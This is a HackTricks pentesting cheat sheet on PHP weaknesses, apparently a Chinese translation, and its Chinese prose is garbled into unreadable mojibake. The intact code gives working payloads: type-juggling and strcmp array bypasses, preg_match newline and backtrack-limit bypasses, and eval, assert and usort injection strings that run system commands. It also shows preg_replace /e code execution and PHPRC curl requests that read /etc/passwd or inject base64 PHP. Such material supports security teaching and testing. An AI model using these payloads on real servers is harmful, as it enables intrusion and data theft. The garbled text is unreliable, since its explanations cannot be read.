# PHP æŠ€å·§

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆçš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)** ä¸Š**å…³æ³¨æˆ‘ä»¬ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## Cookies å¸¸è§ä½ç½®ï¼š

è¿™ä¹Ÿé€‚ç”¨äº phpMyAdmin çš„ cookiesã€‚

Cookies:
```
PHPSESSID
phpMyAdmin
```
åœ°ç‚¹ï¼š
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## ç»•è¿‡ PHP æ¯”è¾ƒ

### å¼±æ¯”è¾ƒ/ç±»å‹è½¬æ¢ï¼ˆ==ï¼‰

å¦‚æœåœ¨ PHP ä¸­ä½¿ç”¨ `==`ï¼Œåˆ™å­˜åœ¨æ„å¤–æƒ…å†µï¼Œæ¯”è¾ƒçš„è¡Œä¸ºä¸é¢„æœŸä¸åŒã€‚è¿™æ˜¯å› ä¸º "==" ä»…æ¯”è¾ƒè½¬æ¢ä¸ºç›¸åŒç±»å‹çš„å€¼ï¼Œå¦‚æœæ‚¨è¿˜æƒ³æ¯”è¾ƒæ‰€æ¯”è¾ƒæ•°æ®çš„ç±»å‹æ˜¯å¦ç›¸åŒï¼Œæ‚¨éœ€è¦ä½¿ç”¨ `===`ã€‚

PHP æ¯”è¾ƒè¡¨æ ¼ï¼š[https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` ä»¥éæ•°å­—å¼€å¤´çš„å­—ç¬¦ä¸²ç­‰äºæ•°å­—
* `"0xAAAA" == "43690" -> True` ç”±åè¿›åˆ¶æˆ–åå…­è¿›åˆ¶æ ¼å¼çš„æ•°å­—ç»„æˆçš„å­—ç¬¦ä¸²å¯ä»¥ä¸å…¶ä»–æ•°å­—/å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæ•°å­—ç›¸åŒï¼Œåˆ™ç»“æœä¸º Trueï¼ˆå­—ç¬¦ä¸²ä¸­çš„æ•°å­—è¢«è§£é‡Šä¸ºæ•°å­—ï¼‰
* `"0e3264578" == 0 --> True` ä»¥ "0e" å¼€å¤´å¹¶è·Ÿéšä»»ä½•å†…å®¹çš„å­—ç¬¦ä¸²å°†ç­‰äº 0
* `"0X3264578" == 0X --> True` ä»¥ "0" å¼€å¤´å¹¶è·Ÿéšä»»ä½•å­—æ¯ï¼ˆX å¯ä»¥æ˜¯ä»»ä½•å­—æ¯ï¼‰å’Œä»»ä½•å†…å®¹çš„å­—ç¬¦ä¸²å°†ç­‰äº 0
* `"0e12334" == "0" --> True` è¿™éå¸¸æœ‰è¶£ï¼Œå› ä¸ºåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥æ§åˆ¶ä»¥ "0" å¼€å¤´çš„å­—ç¬¦ä¸²è¾“å…¥ä»¥åŠæ­£åœ¨è¿›è¡Œå“ˆå¸Œå¹¶ä¸å…¶è¿›è¡Œæ¯”è¾ƒçš„æŸäº›å†…å®¹ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨å¯ä»¥æä¾›ä¸€ä¸ªå°†åˆ›å»ºä»¥ "0e" å¼€å¤´ä¸”æ²¡æœ‰ä»»ä½•å­—æ¯çš„å“ˆå¸Œçš„å€¼ï¼Œæ‚¨å¯ä»¥ç»•è¿‡æ¯”è¾ƒã€‚æ‚¨å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°å…·æœ‰æ­¤æ ¼å¼çš„**å·²ç»å“ˆå¸Œçš„å­—ç¬¦ä¸²**ï¼š[https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` å­—ç¬¦ä¸²ä¸­çš„ä»»ä½•å­—æ¯ç­‰äºæ•´æ•° 0

æ›´å¤šä¿¡æ¯è¯·å‚é˜… [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**ç±»å‹è½¬æ¢** ä¹Ÿä¼šå½±å“åˆ° `in_array()` å‡½æ•°ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ˆéœ€è¦å°†ç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸º true æ‰èƒ½è¿›è¡Œä¸¥æ ¼æ¯”è¾ƒï¼‰ï¼š
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

å¦‚æœæ­¤å‡½æ•°ç”¨äº**ä»»ä½•èº«ä»½éªŒè¯æ£€æŸ¥**ï¼ˆæ¯”å¦‚æ£€æŸ¥å¯†ç ï¼‰ï¼Œå¹¶ä¸”ç”¨æˆ·æ§åˆ¶æ¯”è¾ƒçš„ä¸€ä¾§ï¼Œä»–å¯ä»¥å‘é€ä¸€ä¸ªç©ºæ•°ç»„è€Œä¸æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå¯†ç çš„å€¼ï¼ˆ`https://example.com/login.php/?username=admin&password[]=`ï¼‰ï¼Œä»è€Œç»•è¿‡æ­¤æ£€æŸ¥ï¼š
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
### ä¸¥æ ¼ç±»å‹è½¬æ¢

å³ä½¿ä½¿ç”¨ `===`ï¼Œä»å¯èƒ½å‡ºç°é”™è¯¯ï¼Œä½¿æ¯”è¾ƒå®¹æ˜“å—åˆ°ç±»å‹è½¬æ¢çš„å½±å“ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ¯”è¾ƒåœ¨æ¯”è¾ƒä¹‹å‰å°†æ•°æ®è½¬æ¢ä¸ºä¸åŒç±»å‹çš„å¯¹è±¡ï¼š
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** å¯ç”¨äº**éªŒè¯ç”¨æˆ·è¾“å…¥**ï¼ˆå®ƒ**æ£€æŸ¥**ç”¨æˆ·è¾“å…¥ä¸­æ˜¯å¦å­˜åœ¨**é»‘åå•**ä¸­çš„ä»»ä½•**å•è¯/æ­£åˆ™è¡¨è¾¾å¼**ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™ä»£ç å¯ä»¥ç»§ç»­æ‰§è¡Œï¼‰ã€‚

#### æ¢è¡Œç¬¦ç»•è¿‡

ç„¶è€Œï¼Œå½“é™å®šæ­£åˆ™è¡¨è¾¾å¼çš„å¼€å¤´æ—¶ï¼Œ`preg_match()` **åªæ£€æŸ¥ç”¨æˆ·è¾“å…¥çš„ç¬¬ä¸€è¡Œ**ï¼Œå¦‚æœä»¥æŸç§æ–¹å¼å¯ä»¥**å‘é€**è¾“å…¥**å¤šè¡Œ**ï¼Œåˆ™å¯ä»¥ç»•è¿‡æ­¤æ£€æŸ¥ã€‚ç¤ºä¾‹ï¼š
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
è¦ç»•è¿‡æ­¤æ£€æŸ¥ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨æ–°è¡Œè¿›è¡Œurlç¼–ç ï¼ˆ`%0A`ï¼‰å‘é€å€¼ï¼Œæˆ–è€…å¦‚æœå¯ä»¥å‘é€JSONæ•°æ®ï¼Œåˆ™å°†å…¶åˆ†æˆ**å¤šè¡Œ**å‘é€ï¼š
```php
{
"cmd": "cat /etc/passwd"
}
```
æ‰¾åˆ°ä¸€ä¸ªç¤ºä¾‹ï¼š[https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **é•¿åº¦é”™è¯¯ç»•è¿‡**

ï¼ˆè¿™ä¸ªç»•è¿‡ä¼¼ä¹åœ¨ PHP 5.2.5 ä¸Šå°è¯•è¿‡ï¼Œä½†æˆ‘æ— æ³•åœ¨ PHP 7.3.15 ä¸Šä½¿å…¶å·¥ä½œï¼‰\
å¦‚æœä½ å¯ä»¥å‘ `preg_match()` å‘é€ä¸€ä¸ªæœ‰æ•ˆçš„éå¸¸**å¤§çš„è¾“å…¥**ï¼Œå®ƒå°†**æ— æ³•å¤„ç†**å®ƒï¼Œä½ å°±å¯ä»¥**ç»•è¿‡**æ£€æŸ¥ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå®ƒåœ¨é»‘åå•ä¸­åˆ—å‡ºäº†ä¸€ä¸ª JSONï¼Œä½ å¯ä»¥å‘é€ï¼š
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
#### ReDoS Bypass

Trick from: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223)


<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

ç®€è€Œè¨€ä¹‹ï¼Œé—®é¢˜å‘ç”Ÿåœ¨PHPä¸­çš„`preg_*`å‡½æ•°ä¸Šï¼Œå®ƒå»ºç«‹åœ¨[PCREåº“](http://www.pcre.org/)çš„åŸºç¡€ä¸Šã€‚åœ¨PCREä¸­ï¼ŒæŸäº›æ­£åˆ™è¡¨è¾¾å¼æ˜¯é€šè¿‡å¤§é‡é€’å½’è°ƒç”¨æ¥åŒ¹é…çš„ï¼Œè¿™ä¼šä½¿ç”¨å¤§é‡å †æ ˆç©ºé—´ã€‚å¯ä»¥è®¾ç½®å…è®¸çš„é€’å½’æ¬¡æ•°ä¸Šé™ï¼Œä½†åœ¨PHPä¸­ï¼Œæ­¤é™åˆ¶[é»˜è®¤ä¸º 100,000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit)ï¼Œè¿™è¶…å‡ºäº†å †æ ˆçš„å®¹é‡ã€‚

[è¿™ä¸ªStackoverflowä¸»é¢˜](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error)ä¹Ÿåœ¨å¸–å­ä¸­é“¾æ¥ï¼Œå…¶ä¸­æ›´æ·±å…¥åœ°è®¨è®ºäº†è¿™ä¸ªé—®é¢˜ã€‚æˆ‘ä»¬çš„ä»»åŠ¡ç°åœ¨å¾ˆæ˜ç¡®ï¼š\
**å‘é€ä¸€ä¸ªè¾“å…¥ï¼Œä½¿æ­£åˆ™è¡¨è¾¾å¼æ‰§è¡Œ 100,000+ æ¬¡é€’å½’ï¼Œå¯¼è‡´ SIGSEGVï¼Œä½¿`preg_match()`å‡½æ•°è¿”å›`false`ï¼Œä»è€Œä½¿åº”ç”¨ç¨‹åºè®¤ä¸ºæˆ‘ä»¬çš„è¾“å…¥ä¸æ˜¯æ¶æ„çš„ï¼Œåœ¨è´Ÿè½½çš„æœ«å°¾æŠ›å‡ºç±»ä¼¼`{system(<verybadcommand>)} `çš„å†…å®¹ï¼Œä»¥è·å– SSTI --> RCE --> flag :)**ã€‚

åœ¨æ­£åˆ™è¡¨è¾¾å¼æœ¯è¯­ä¸­ï¼Œæˆ‘ä»¬å®é™…ä¸Šå¹¶æ²¡æœ‰æ‰§è¡Œ 100k "é€’å½’"ï¼Œè€Œæ˜¯åœ¨è®¡ç®—"å›æº¯æ­¥éª¤"ï¼Œæ­£å¦‚[PHPæ–‡æ¡£](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit)æ‰€è¿°ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨`pcre.backtrack_limit`å˜é‡ä¸­é»˜è®¤ä¸º 1,000,000ï¼ˆ1Mï¼‰ã€‚\
è¦è¾¾åˆ°è¿™ä¸ªç›®æ ‡ï¼Œ`'X'*500_001`å°†å¯¼è‡´ 100 ä¸‡ä¸ªå›æº¯æ­¥éª¤ï¼ˆ50 ä¸‡å‘å‰å’Œ 50 ä¸‡å‘åï¼‰ï¼š
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### ç”¨äº PHP æ··æ·†çš„ç±»å‹è½¬æ¢
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## æ‰§è¡Œé‡å®šå‘å (EAR)

å¦‚æœ PHP æ­£åœ¨é‡å®šå‘åˆ°å¦ä¸€ä¸ªé¡µé¢ï¼Œä½†åœ¨è®¾ç½®äº† **`Location`** å¤´ä¹‹åæ²¡æœ‰è°ƒç”¨ **`die`** æˆ– **`exit`** å‡½æ•°ï¼ŒPHP å°†ç»§ç»­æ‰§è¡Œå¹¶å°†æ•°æ®é™„åŠ åˆ°ä¸»ä½“ä¸­ï¼š
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## æ›´å¤šæŠ€å·§

* **register\_globals**ï¼šåœ¨ **PHP < 4.1.1.1** æˆ–è€…é…ç½®é”™è¯¯çš„æƒ…å†µä¸‹ï¼Œ**register\_globals** å¯èƒ½ä¼šè¢«æ¿€æ´»ï¼ˆæˆ–è€…å®ƒä»¬çš„è¡Œä¸ºè¢«æ¨¡ä»¿ï¼‰ã€‚è¿™æ„å‘³ç€åœ¨å…¨å±€å˜é‡ä¸­ï¼Œæ¯”å¦‚ $\_GETï¼Œå¦‚æœå®ƒä»¬æœ‰ä¸€ä¸ªå€¼ï¼Œæ¯”å¦‚ $\_GET\["param"]="1234"ï¼Œä½ å¯ä»¥é€šè¿‡ **$param** è®¿é—®å®ƒã€‚å› æ­¤ï¼Œé€šè¿‡å‘é€ HTTP å‚æ•°ï¼Œä½ å¯ä»¥è¦†ç›–åœ¨ä»£ç ä¸­ä½¿ç”¨çš„å˜é‡ã€‚
* **åŒä¸€åŸŸçš„ PHPSESSION cookies å­˜å‚¨åœ¨åŒä¸€ä½ç½®**ï¼Œå› æ­¤å¦‚æœåœ¨ä¸€ä¸ªåŸŸä¸­**ä¸åŒè·¯å¾„ä½¿ç”¨ä¸åŒçš„ cookies**ï¼Œä½ å¯ä»¥ä½¿ä¸€ä¸ªè·¯å¾„**è®¿é—®å¦ä¸€ä¸ªè·¯å¾„çš„ cookie**ï¼Œè®¾ç½®å¦ä¸€ä¸ªè·¯å¾„ cookie çš„å€¼ã€‚è¿™æ ·ï¼Œå¦‚æœ**ä¸¤ä¸ªè·¯å¾„è®¿é—®å…·æœ‰ç›¸åŒåç§°çš„å˜é‡**ï¼Œä½ å¯ä»¥ä½¿**è·¯å¾„1 ä¸­è¯¥å˜é‡çš„å€¼åº”ç”¨äºè·¯å¾„2**ã€‚ç„¶åè·¯å¾„2å°†è§†è·¯å¾„1çš„å˜é‡ä¸ºæœ‰æ•ˆï¼ˆé€šè¿‡ç»™ cookie åˆ†é…åœ¨è·¯å¾„2ä¸­å¯¹åº”çš„åç§°ï¼‰ã€‚
* å½“ä½ æœ‰æœºå™¨ç”¨æˆ·çš„**ç”¨æˆ·å**æ—¶ï¼Œè¯·æ£€æŸ¥åœ°å€ï¼š**/\~\<USERNAME>**ï¼Œçœ‹çœ‹ PHP ç›®å½•æ˜¯å¦è¢«æ¿€æ´»ã€‚
* [**ä½¿ç”¨ php wrappers è¿›è¡Œ LFI å’Œ RCE**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

è¿™äº›å‡½æ•°é€šå¸¸ç”¨äº PHP ä¸­**ä»å¯†ç ç”Ÿæˆå“ˆå¸Œ**ï¼Œä»¥åŠ**æ£€æŸ¥**å¯†ç æ˜¯å¦ä¸å“ˆå¸ŒåŒ¹é…ã€‚\
æ”¯æŒçš„ç®—æ³•æœ‰ï¼š`PASSWORD_DEFAULT` å’Œ `PASSWORD_BCRYPT`ï¼ˆä»¥ `$2y$` å¼€å¤´ï¼‰ã€‚è¯·æ³¨æ„ï¼Œ**PASSWORD\_DEFAULT ç»å¸¸ä¸ PASSWORD\_BCRYPT ç›¸åŒ**ã€‚ç›®å‰ï¼Œ**PASSWORD\_BCRYPT** åœ¨è¾“å…¥ä¸Šæœ‰ä¸€ä¸ª**å¤§å°é™åˆ¶ä¸º 72 å­—èŠ‚**ã€‚å› æ­¤ï¼Œå½“ä½ å°è¯•ä½¿ç”¨æ­¤ç®—æ³•å¯¹å¤§äº 72 å­—èŠ‚çš„å†…å®¹è¿›è¡Œå“ˆå¸Œæ—¶ï¼Œåªæœ‰å‰ 72 å­—èŠ‚ä¼šè¢«ä½¿ç”¨ï¼š
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP headers bypass abusing PHP errors

å¦‚æœä¸€ä¸ª **PHP é¡µé¢æ‰“å°é”™è¯¯å¹¶å›æ˜¾ç”¨æˆ·æä¾›çš„ä¸€äº›è¾“å…¥**ï¼Œç”¨æˆ·å¯ä»¥ä½¿ PHP æœåŠ¡å™¨æ‰“å°å›ä¸€äº› **è¶³å¤Ÿé•¿çš„å†…å®¹**ï¼Œä»¥ä¾¿åœ¨å°è¯• **å°†å¤´éƒ¨æ·»åŠ åˆ°å“åº”** æ—¶æœåŠ¡å™¨ä¼šæŠ›å‡ºé”™è¯¯ã€‚\
åœ¨ä»¥ä¸‹åœºæ™¯ä¸­ï¼Œ**æ”»å‡»è€…è®©æœåŠ¡å™¨æŠ›å‡ºä¸€äº›å¤§é”™è¯¯**ï¼Œæ­£å¦‚æ‚¨åœ¨å±å¹•ä¸Šçœ‹åˆ°çš„ï¼Œå½“ PHP å°è¯• **ä¿®æ”¹å¤´éƒ¨ä¿¡æ¯æ—¶ï¼Œæ— æ³•æˆåŠŸ**ï¼ˆä¾‹å¦‚ CSP å¤´éƒ¨æœªå‘é€ç»™ç”¨æˆ·ï¼‰ï¼š

![](<../../../.gitbook/assets/image (465).png>)

## Code execution

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[æŸ¥çœ‹æ›´å¤šæœ‰ç”¨çš„ PHP å‡½æ•°](php-useful-functions-disable\_functions-open\_basedir-bypass/) 

### **é€šè¿‡ preg\_replace() å®ç° RCE**
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
è¦æ‰§è¡Œâ€œreplaceâ€å‚æ•°ä¸­çš„ä»£ç ï¼Œè‡³å°‘éœ€è¦ä¸€ä¸ªåŒ¹é…é¡¹ã€‚\
è¿™ä¸ªpreg\_replaceé€‰é¡¹åœ¨PHP 5.5.0ä¸­å·²ç»**è¢«å¼ƒç”¨**ã€‚

### **é€šè¿‡Eval()å®ç°RCE**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **é€šè¿‡ Assert() å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰**

è¿™ä¸ª php å‡½æ•°å…è®¸æ‚¨**æ‰§è¡Œä»¥å­—ç¬¦ä¸²å½¢å¼ç¼–å†™çš„ä»£ç **ï¼Œä»¥ä¾¿**è¿”å› true æˆ– false**ï¼ˆå¹¶æ ¹æ®æ­¤ä¿®æ”¹æ‰§è¡Œï¼‰ã€‚é€šå¸¸ç”¨æˆ·å˜é‡å°†è¢«æ’å…¥åˆ°å­—ç¬¦ä¸²çš„ä¸­é—´ã€‚ä¾‹å¦‚ï¼š\
`assert("strpos($_GET['page']),'..') === false")` --> åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¦è·å¾—**RCE**ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œï¼š
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
æ‚¨éœ€è¦**ç ´å**ä»£ç **è¯­æ³•**ï¼Œ**æ·»åŠ **æ‚¨çš„**æœ‰æ•ˆè½½è·**ï¼Œç„¶åå†**ä¿®å¤**å®ƒã€‚æ‚¨å¯ä»¥ä½¿ç”¨**é€»è¾‘æ“ä½œ**ï¼Œå¦‚"**and**"æˆ–"**%26%26**"æˆ–"**|**"ã€‚è¯·æ³¨æ„ï¼Œ"or"ï¼Œ"||"ä¸èµ·ä½œç”¨ï¼Œå› ä¸ºå¦‚æœç¬¬ä¸€ä¸ªæ¡ä»¶ä¸ºçœŸï¼Œæˆ‘ä»¬çš„æœ‰æ•ˆè½½è·å°†ä¸ä¼šè¢«æ‰§è¡Œã€‚åŒæ ·ï¼Œ";"ä¹Ÿä¸èµ·ä½œç”¨ï¼Œå› ä¸ºæˆ‘ä»¬çš„æœ‰æ•ˆè½½è·ä¸ä¼šè¢«æ‰§è¡Œã€‚

**å¦ä¸€ç§é€‰æ‹©**æ˜¯å°†å‘½ä»¤çš„æ‰§è¡Œæ·»åŠ åˆ°å­—ç¬¦ä¸²ä¸­ï¼š`'.highlight_file('.passwd').'`

**å¦ä¸€ç§é€‰æ‹©**ï¼ˆå¦‚æœæ‚¨æœ‰å†…éƒ¨ä»£ç ï¼‰æ˜¯ä¿®æ”¹æŸäº›å˜é‡ä»¥æ›´æ”¹æ‰§è¡Œæ–¹å¼ï¼š`$file = "hola"`

### **é€šè¿‡usort()å®ç°RCE**

æ­¤å‡½æ•°ç”¨äºä½¿ç”¨ç‰¹å®šå‡½æ•°å¯¹é¡¹ç›®æ•°ç»„è¿›è¡Œæ’åºã€‚\
è¦æ»¥ç”¨æ­¤å‡½æ•°ï¼š
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
### é€šè¿‡ .httaccess å®ç° RCE

å¦‚æœä½ å¯ä»¥**ä¸Šä¼ **ä¸€ä¸ª **.htaccess** æ–‡ä»¶ï¼Œé‚£ä¹ˆä½ å¯ä»¥**é…ç½®**å¤šç§è®¾ç½®ï¼Œç”šè‡³æ‰§è¡Œä»£ç ï¼ˆé…ç½®å…è®¸æ‰§è¡Œæ‰©å±•åä¸º .htaccess çš„æ–‡ä»¶ï¼‰ã€‚

å¯ä»¥åœ¨[è¿™é‡Œ](https://github.com/wireghoul/htshells)æ‰¾åˆ°ä¸åŒçš„ .htaccess shellsã€‚

### é€šè¿‡ç¯å¢ƒå˜é‡å®ç° RCE

å¦‚æœä½ å‘ç°ä¸€ä¸ªæ¼æ´å…è®¸ä½ **ä¿®æ”¹ PHP ä¸­çš„ç¯å¢ƒå˜é‡**ï¼ˆè¿˜æœ‰å¦ä¸€ä¸ªå…è®¸ä¸Šä¼ æ–‡ä»¶çš„æ¼æ´ï¼Œå°½ç®¡é€šè¿‡æ›´å¤šç ”ç©¶å¯èƒ½å¯ä»¥ç»•è¿‡ï¼‰ï¼Œä½ å¯ä»¥æ»¥ç”¨è¿™ç§è¡Œä¸ºæ¥å®ç°**RCE**ã€‚

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path)ï¼šè¿™ä¸ªç¯å¢ƒå˜é‡å…è®¸ä½ åœ¨æ‰§è¡Œå…¶ä»–äºŒè¿›åˆ¶æ–‡ä»¶æ—¶åŠ è½½ä»»æ„åº“ï¼ˆå°½ç®¡åœ¨è¿™ç§æƒ…å†µä¸‹å¯èƒ½ä¸èµ·ä½œç”¨ï¼‰ã€‚
* **`PHPRC`**ï¼šæŒ‡ç¤º PHP **æŸ¥æ‰¾å…¶é…ç½®æ–‡ä»¶**çš„ä½ç½®ï¼Œé€šå¸¸ç§°ä¸º `php.ini`ã€‚å¦‚æœä½ å¯ä»¥ä¸Šä¼ è‡ªå·±çš„é…ç½®æ–‡ä»¶ï¼Œé‚£ä¹ˆä½¿ç”¨ `PHPRC` æ¥æŒ‡å‘ PHPã€‚æ·»åŠ ä¸€ä¸ª**`auto_prepend_file`**æ¡ç›®ï¼ŒæŒ‡å®šç¬¬äºŒä¸ªä¸Šä¼ çš„æ–‡ä»¶ã€‚è¿™ç¬¬äºŒä¸ªæ–‡ä»¶åŒ…å«**æ™®é€šçš„ PHP ä»£ç **ï¼Œç„¶åç”± PHP è¿è¡Œæ—¶åœ¨ä»»ä½•å…¶ä»–ä»£ç ä¹‹å‰æ‰§è¡Œã€‚
1. ä¸Šä¼ ä¸€ä¸ªåŒ…å«æˆ‘ä»¬ shellcode çš„ PHP æ–‡ä»¶
2. ä¸Šä¼ ç¬¬äºŒä¸ªæ–‡ä»¶ï¼ŒåŒ…å«ä¸€ä¸ª**`auto_prepend_file`**æŒ‡ä»¤ï¼ŒæŒ‡ç¤º PHP é¢„å¤„ç†å™¨æ‰§è¡Œæˆ‘ä»¬åœ¨æ­¥éª¤ 1 ä¸­ä¸Šä¼ çš„æ–‡ä»¶
3. &#x20;å°† `PHPRC` å˜é‡è®¾ç½®ä¸ºæˆ‘ä»¬åœ¨æ­¥éª¤ 2 ä¸­ä¸Šä¼ çš„æ–‡ä»¶ã€‚
* è·å–æœ‰å…³å¦‚ä½•æ‰§è¡Œæ­¤é“¾çš„æ›´å¤šä¿¡æ¯[**æ¥è‡ªåŸå§‹æŠ¥å‘Š**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/)ã€‚
* **PHPRC** - å¦ä¸€ä¸ªé€‰é¡¹
* å¦‚æœä½ **æ— æ³•ä¸Šä¼ æ–‡ä»¶**ï¼Œä½ å¯ä»¥åœ¨ FreeBSD ä¸­ä½¿ç”¨åŒ…å«**`stdin`**çš„**`/dev/fd/0`**æ–‡ä»¶ï¼Œå®ƒæ˜¯å‘é€åˆ° `stdin` çš„è¯·æ±‚çš„**ä¸»ä½“**ï¼š
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* æˆ–è€…è¦è·å¾— RCEï¼Œå¯ç”¨**`allow_url_include`**å¹¶åœ¨**base64 PHP ä»£ç **ä¹‹å‰æ·»åŠ ä¸€ä¸ªæ–‡ä»¶ï¼š
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* æŠ€æœ¯[**æ¥è‡ªæ­¤æŠ¥å‘Š**](https://vulncheck.com/blog/juniper-cve-2023-36845)ã€‚
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
å¦‚æœæ‚¨æ­£åœ¨è°ƒè¯•PHPåº”ç”¨ç¨‹åºï¼Œå¯ä»¥åœ¨`/etc/php5/apache2/php.ini`ä¸­å…¨å±€å¯ç”¨é”™è¯¯æ‰“å°ï¼Œæ·»åŠ `display_errors = On`å¹¶é‡æ–°å¯åŠ¨apacheï¼š`sudo systemctl restart apache2`

### è§£å¯†PHPä»£ç 

æ‚¨å¯ä»¥ä½¿ç”¨**ç½‘ç«™**[**www.unphp.net**](http://www.unphp.net)**æ¥è§£å¯†PHPä»£ç ã€‚**

## PHPåŒ…è£…å™¨å’Œåè®®

